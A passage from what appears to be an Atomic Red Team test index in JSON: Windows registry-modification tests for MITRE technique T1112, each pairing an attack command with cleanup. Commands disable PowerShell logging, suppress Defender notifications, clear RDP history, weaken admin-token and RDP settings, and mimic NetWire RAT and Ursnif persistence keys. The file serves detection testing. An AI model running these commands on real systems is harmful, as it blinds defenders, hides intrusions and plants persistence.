			"command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force\n",
			"cleanup_command": "Remove-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name LocalAccountTokenFilterPolicy -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name EnableLinkedConnections -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" -Name LongPathsEnabled -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Windows Registry Tool",
		"auto_generated_guid": "ac34b0f7-0f85-4ac0-b93e-3ced2bc69bb8",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableRegistryTools /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "powershell Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system\" -Name DisableRegistryTools -ErrorAction Ignore\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Windows CMD application",
		"auto_generated_guid": "d2561a6d-72bd-408c-b150-13efe1801c2a",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "New-ItemProperty -Path \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\System\" -Name DisableCMD -Value 1\n",
			"cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\System\" -Name DisableCMD -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Windows Task Manager application",
		"auto_generated_guid": "af254e70-dd0e-4de6-9afe-a994d9ea8b62",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskmgr /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskmgr /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Windows Notification Center",
		"auto_generated_guid": "c0d6d67f-1f63-42cc-95c0-5fd6b20082ad",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Windows Shutdown Button",
		"auto_generated_guid": "6e0d1131-2d7e-4905-8ca5-d6172f05d03d",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f\n",
			"cleanup_command": "reg delete \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v shutdownwithoutlogon /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Windows LogOff Button",
		"auto_generated_guid": "e246578a-c24d-46a7-9237-0213ff86fb0c",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoLogOff /t REG_DWORD /d 1 /f\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v StartMenuLogOff /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoLogOff /f >nul 2>&1\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v StartMenuLogOff /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Windows Change Password Feature",
		"auto_generated_guid": "d4a6da40-618f-454d-9a9e-26af552aaeb0",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableChangePassword /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableChangePassword /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Windows Lock Workstation Feature",
		"auto_generated_guid": "3dacb0d2-46ee-4c27-ac1b-f9886bf91a56",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableLockWorkstation /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableLockWorkstation /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Activate Windows NoDesktop Group Policy Feature",
		"auto_generated_guid": "93386d41-525c-4a1b-8235-134a628dee17",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDesktop /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDesktop /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Activate Windows NoRun Group Policy Feature",
		"auto_generated_guid": "d49ff3cc-8168-4123-b5b3-f057d9abbd55",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /f \n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Activate Windows NoFind Group Policy Feature",
		"auto_generated_guid": "ffbb407e-7f1d-4c95-b22e-548169db1fbd",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFind /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFind /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Activate Windows NoControlPanel Group Policy Feature",
		"auto_generated_guid": "a450e469-ba54-4de1-9deb-9023a6111690",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Activate Windows NoFileMenu Group Policy Feature",
		"auto_generated_guid": "5e27bdb4-7fd9-455d-a2b5-4b4b22c9dea4",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFileMenu /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFileMenu /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Activate Windows NoClose Group Policy Feature",
		"auto_generated_guid": "12f50e15-dbc6-478b-a801-a746e8ba1723",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Activate Windows NoSetTaskbar Group Policy Feature",
		"auto_generated_guid": "d29b7faf-7355-4036-9ed3-719bd17951ed",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoSetTaskbar /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoSetTaskbar /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Activate Windows NoTrayContextMenu Group Policy Feature",
		"auto_generated_guid": "4d72d4b1-fa7b-4374-b423-0fe326da49d2",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoTrayContextMenu /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoTrayContextMenu /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Activate Windows NoPropertiesMyDocuments Group Policy Feature",
		"auto_generated_guid": "20fc9daa-bd48-4325-9aff-81b967a84b1d",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoPropertiesMyDocuments /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Hide Windows Clock Group Policy Feature",
		"auto_generated_guid": "8023db1e-ad06-4966-934b-b6a0ae52689e",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideClock /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideClock /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Windows HideSCAHealth Group Policy Feature",
		"auto_generated_guid": "a4637291-40b1-4a96-8c82-b28f1d73e54e",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAHealth /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAHealth /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Windows HideSCANetwork Group Policy Feature",
		"auto_generated_guid": "3e757ce7-eca0-411a-9583-1c33b8508d52",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCANetwork /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCANetwork /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Windows HideSCAPower Group Policy Feature",
		"auto_generated_guid": "8d85a5d8-702f-436f-bc78-fcd9119496fc",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAPower /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAPower /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Windows HideSCAVolume Group Policy Feature",
		"auto_generated_guid": "7f037590-b4c6-4f13-b3cc-e424c5ab8ade",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAVolume /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAVolume /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Windows Modify Show Compress Color And Info Tip Registry",
		"auto_generated_guid": "795d3248-0394-4d4d-8e86-4e8df2a2693f",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f\n",
			"cleanup_command": "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowInfoTip /f >nul 2>&1\nreg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowCompColor /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Windows Powershell Logging Disabled",
		"auto_generated_guid": "95b25212-91a7-42ff-9613-124aca6845a8",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /f >nul 2>&1\n",
			"cleanup_command": "reg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging /v EnableModuleLogging /f >nul 2>&1\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging /v EnableScriptBlockLogging /f >nul 2>&1\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableTranscripting /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Windows Add Registry Value to Load Service in Safe Mode without Network",
		"auto_generated_guid": "1dd59fb3-1cb3-4828-805d-cf80b4c3bbb5",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\AtomicSafeMode\" /VE /T REG_SZ /F /D \"Service\"\n",
			"cleanup_command": "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\AtomicSafeMode\" /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Windows Add Registry Value to Load Service in Safe Mode with Network",
		"auto_generated_guid": "c173c948-65e5-499c-afbe-433722ed5bd4",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\AtomicSafeMode\" /VE /T REG_SZ /F /D \"Service\"\n",
			"cleanup_command": "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\AtomicSafeMode\" /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Windows Toast Notifications",
		"auto_generated_guid": "003f466a-6010-4b15-803a-cbb478a314d7",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f\n",
			"cleanup_command": "reg delete HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications /v ToastEnabled /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Windows Security Center Notifications",
		"auto_generated_guid": "45914594-8df6-4ea9-b3cc-7eb9321a807e",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f\n",
			"cleanup_command": "reg delete HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Suppress Win Defender Notifications",
		"auto_generated_guid": "c30dada3-7777-4590-b970-dc890b8cf113",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" /v Notification_Suppress /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" /v Notification_Suppress /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Allow RDP Remote Assistance Feature",
		"auto_generated_guid": "86677d0e-0b5e-4a2b-b302-454175f9aa9e",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "NetWire RAT Registry Key Creation",
		"auto_generated_guid": "65704cd4-6e36-4b90-b6c1-dc29a82c8e56",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NetWire /t REG_SZ  /d \"C:\\Users\\admin\\AppData\\Roaming\\Install\\Host.exe\" /f\nreg add HKCU\\SOFTWARE\\NetWire /v HostId /t REG_SZ /d HostId-kai6Ci /f\nreg add HKCU\\SOFTWARE\\NetWire /v \"Install Date\" /t REG_SZ /d \"2021-08-30 07:17:27\" /f\n",
			"cleanup_command": "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NetWire /f >nul 2>&1\nreg delete HKCU\\SOFTWARE\\NetWire /va /f >nul 2>&1\nreg delete HKCU\\SOFTWARE\\NetWire /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Ursnif Malware Registry Key Creation",
		"auto_generated_guid": "c375558d-7c25-45e9-bd64-7b23a97c1db0",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /v comsxRes /t REG_BINARY  /d 72656463616e617279 /f\n",
			"cleanup_command": "reg delete HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /va /f >nul 2>&1\nreg delete HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Terminal Server Client Connection History Cleared",
		"auto_generated_guid": "3448824b-3c35-4a9e-a8f5-f887f68bea21",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Must have the \"MR9\" Remote Desktop Connection history Key \n",
				"prereq_command": "if ((Get-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\Default\\\").MR9) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -path \"HKCU:\\SOFTWARE\\Microsoft\\\" -name \"Terminal Server Client\"  -ErrorAction Ignore\nNew-Item -path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\\" -name \"Default\" -ErrorAction Ignore\nNew-Itemproperty -path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\Default\" -name \"MR9\" -value \"127.0.0.1\"  -PropertyType \"String\" -ErrorAction Ignore\nNew-Item -path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\\" -name \"Servers\" -ErrorAction Ignore\nNew-Item -path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\Servers\" -name \"Redcanary\" -ErrorAction Ignore\n"
			}
		],
		"executor": {
			"command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable Windows Error Reporting Settings",
		"auto_generated_guid": "d2c9e41e-cd86-473d-980d-b6403562e3e1",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\nreg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\n",
			"cleanup_command": "reg delete HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /f >nul 2>&1\nreg delete HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "DisallowRun Execution Of Certain Applications",
		"auto_generated_guid": "71db768a-5a9c-4047-b5e7-59e01f188e84",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisallowRun /t REG_DWORD /d 1 /f\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /f /t REG_SZ /v art1 /d \"regedit.exe\"\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /f /t REG_SZ /v art2 /d \"cmd.exe\"\n",
			"cleanup_command": "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisallowRun /f >nul 2>&1\nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v art1 /f >nul 2>&1\nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v art2 /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Enabling Restricted Admin Mode via Command_Prompt",
		"auto_generated_guid": "fe7974e5-5813-477b-a7bd-311d4f535e83",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0\n",
			"cleanup_command": "reg delete \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Mimic Ransomware - Enable Multiple User Sessions",
		"auto_generated_guid": "39f1f378-ba8a-42b3-96dc-2a6540cfc1e3",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f\n",
			"cleanup_command": "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon /v AllowMultipleTSSessions /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Mimic Ransomware - Allow Multiple RDP Sessions per User",
		"auto_generated_guid": "35727d9e-7a7f-4d0c-a259-dc3906d6e8b9",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f\n",
			"cleanup_command": "reg delete \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1112",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Event Viewer Registry Modification - Redirection URL",
		"auto_generated_guid": "6174be7f-5153-4afd-92c5-e0c3b7cdb5ae",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"redirection_url": {
				"description": "URL to open or file URI to execute upon opening the event help",
				"type": "url",
				"default": "file://C:\\windows\\system32\\notepad.exe"
			}
		},
		"executor": {
			"command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionURL /t REG_SZ /d \"#{redirection_url}\" /f",
